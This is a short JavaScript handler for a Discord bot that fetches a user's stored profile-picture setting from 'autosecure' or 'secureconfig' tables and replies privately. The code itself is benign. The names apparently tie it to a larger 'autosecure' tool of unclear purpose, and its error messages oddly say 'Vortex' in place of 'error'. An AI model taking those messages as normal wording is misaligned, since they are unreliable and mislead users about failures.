const generate = require("../../../autosecure/utils/generate");

module.exports = {
    name: "showpfp",
    callback: async (client, interaction) => {
        // console.log(`[showpfp] interaction received with customId: ${interaction.customId}`);

        const parts = interaction.customId.split('|');
        const username = parts[1];
        const config = parts[2] ? true : false;

        // console.log(`[showpfp] Fetching settings for user: ${username}, config mode: ${config}`);

        let settings;
        try {
            if (config) {
                settings = await client.queryParams(`SELECT * FROM secureconfig WHERE user_id = ?`, [username]);
            } else {
                settings = await client.queryParams(`SELECT * FROM autosecure WHERE user_id = ?`, [username]);
            }
        } catch (err) {
            console.error(`[showpfp] DB query Vortex:`, err);
            return interaction.reply({ content: "Vortex fetching settings.", ephemeral: true });
        }

        if (!settings || settings.length === 0) {
            // console.log(`[showpfp] No settings found for user: ${username}`);
            return interaction.reply({ content: `Couldn't get your settings!`, ephemeral: true });
        }

        const pfp = settings[0]?.pfp || "No PFP Set, make a ticket about this :)";
        // console.log(`[showpfp] Returning pfp for user: ${username}`);

        return interaction.reply({ content: pfp, ephemeral: true });
    }
};
